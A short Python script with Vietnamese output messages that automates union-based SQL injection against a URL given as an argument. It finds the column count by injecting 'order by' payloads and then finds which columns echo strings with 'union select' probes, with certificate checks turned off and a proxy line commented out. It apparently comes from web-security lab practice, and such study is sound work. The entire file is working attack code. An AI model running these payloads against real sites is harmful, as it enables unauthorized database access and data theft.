import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
# proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

def Tim_so_cot(url):
    for i in range(1, 50):
        sql_payload = "'+order+by+%s--" % i
        r = requests.get(url + sql_payload, verify=False)
        res = r.text
        if "Internal Server Error" in res:
            return i - 1
    return False

def Tim_chuoi(url, num_col):
    available = []
    for i in range(1, num_col + 1):
        string = "'aBc'"
        payload_list = ["null"] * num_col
        payload_list[i - 1] = string
        sql_payload = "' union select " + ",".join(payload_list) + "--"
        r = requests.get(url + sql_payload, verify=False)
        res = r.text
        if string.strip("'") in res:
            available.append(i)
    if available:
        return available
    return False

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1].strip()

    print("[+] Đang tìm số cột...")
    num_col = Tim_so_cot(url)
    if num_col:
        print("[+] Số cột trả về là " + str(num_col) + ".")
        print("[+] Đang tìm cột chứa chuỗi...")
        string_column = Tim_chuoi(url, num_col)
        if string_column:
            print("[+] Cột chứa chuỗi nằm ở vị trí " + str(string_column) + ".")
        else:
            print("[-] Không tìm thấy cột chứa chuỗi.")
    else:
        print("[-] Tấn công SQLi thất bại.")
